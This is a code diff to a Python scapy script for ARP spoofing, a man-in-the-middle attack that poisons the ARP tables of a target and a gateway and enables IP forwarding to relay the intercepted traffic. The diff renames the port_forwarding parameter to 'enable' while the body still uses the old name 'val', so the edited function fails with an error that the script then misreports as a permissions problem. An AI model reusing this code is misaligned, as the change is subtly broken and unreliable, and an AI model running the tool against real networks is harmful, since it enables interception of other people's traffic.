@@ -33,7 +33,7 @@ def restore(destination_ip,source_ip):
     arp_respond = scapy.ARP(op=2,pdst=destination_ip,hwdst=dst_mac,psrc=source_ip,hwsrc=src_mac)
     scapy.send(arp_respond,verbose=False,count=4)
 
-def port_forwarding(val):
+def port_forwarding(enable=0):
     try:
         with open('/proc/sys/net/ipv4/ip_forward', 'w') as fWrite:
             fWrite.write(str(val))
@@ -65,7 +65,7 @@ try:
     # port forwarding
     pf = True
     try:
-        port_forwarding(1)
+        port_forwarding(enable=1)
     except Exception as _err:
         print ("[-] port forwarding failed, run as root, or do it manually")
         pf = False
@@ -90,6 +90,6 @@ except KeyboardInterrupt:
         restore(gateway_ip,target_ip)
         if pf:
             try:
-                port_forwarding(0)
+                port_forwarding(enable=0)
             except Exception as _err:
                 print ("[-] Disable port forwarding failed, run as root, or do it manually")
